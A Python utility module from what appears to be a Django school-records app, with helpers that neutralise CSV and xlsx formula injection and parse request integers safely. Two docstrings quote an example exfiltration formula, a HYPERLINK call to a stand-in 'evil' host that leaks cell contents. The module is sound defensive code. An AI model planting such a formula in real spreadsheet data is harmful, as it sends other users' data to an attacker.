# Code for util functions and classes used commonly


# Characters Excel, LibreOffice and Google Sheets treat as the start of a
# formula when they appear FIRST in a cell. Tab and CR are included because
# leading whitespace is stripped by the parsers before the check.
_CSV_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value) -> str:
    """Neutralise CSV formula injection (CWE-1236) for one cell.

    A cell beginning with `=`, `+`, `-` or `@` is evaluated as a formula on
    open. Exports here carry student names, parent names and payment concepts —
    all free text, and student creation is available to NON-ADMIN teachers — so
    a name like

        =HYPERLINK("http://evil/"&A1,"Ver")

    is stored by one user and executes on a different, more privileged user's
    workstation when they open pagos.csv. `csv.writer` quotes for CSV syntax; it
    does not and cannot address this, because the payload is valid CSV.

    Prefixing with a single quote is the conventional fix: spreadsheet apps read
    it as "treat the rest as literal text" and hide it, while plain CSV readers
    see one extra character.

    Numbers and dates are passed through untouched — a negative amount is a
    legitimate leading `-` and must not gain a quote, so only `str` values are
    inspected.
    """
    if value is None:
        return ""
    if not isinstance(value, str):
        return value
    return "'" + value if value.startswith(_CSV_FORMULA_PREFIXES) else value


def csv_safe_row(values) -> list:
    """Apply :func:`csv_safe` across an iterable — one call per `writerow`."""
    return [csv_safe(v) for v in values]


def xlsx_safe_append(ws, values) -> None:
    """Append one row to an openpyxl worksheet without letting text become a formula.

    Same threat as :func:`csv_safe` (CWE-1236), different mechanism — and the
    apostrophe trick does NOT work here. openpyxl inspects every string it is
    given and, when it starts with `=`, marks the cell `data_type="f"`: the
    workbook then contains a *real* formula, not a string a spreadsheet app
    might decide to evaluate. So `=HYPERLINK("http://evil/"&A1,"Ver")` typed
    into a student name by a non-admin teacher executes when an admin opens the
    "Base de Datos" export. Prefixing with `'` would only rename the student,
    because in xlsx that apostrophe is stored verbatim and displayed.

    The fix is to write the value and then force the cell back to a string
    cell. The text survives intact (the admin sees the suspicious name exactly
    as stored) and the writer emits it into the shared-strings table, which
    Excel never re-parses.
    """
    ws.append(list(values))
    for cell in ws[ws.max_row]:
        if cell.data_type == "f":
            cell.data_type = "s"


def safe_int(raw, *, default, low=None, high=None):
    """Parse an int from request input, falling back to `default`. Never raises.

    Query strings and form fields are hand-editable, and a bare `int()` on one
    is how `?month=abc` became a 500. The RANGE matters just as much as the
    parse: Django builds a real `date(year, 1, 1)` for a `__year` lookup, so
    `?year=-5` raises ValueError and `?year=99999999999` raises OverflowError —
    both 500s, and both survive an `except (TypeError, ValueError)` that only
    guards the `int()` call itself.

    This lives here because the same helper had been written three times in
    three modules (`payments`, `app_forms`, `reports`) and two further views
    were still missing it. One home, one behaviour.
    """
    try:
        value = int(raw)
    except (TypeError, ValueError):
        return default
    if low is not None and value < low:
        return default
    if high is not None and value > high:
        return default
    return value


# Widest range a view should accept for a year: comfortably inside what a
# DateField can hold, so a `__year` lookup can always build its bounds.
MIN_QUERY_YEAR = 1900
MAX_QUERY_YEAR = 2200
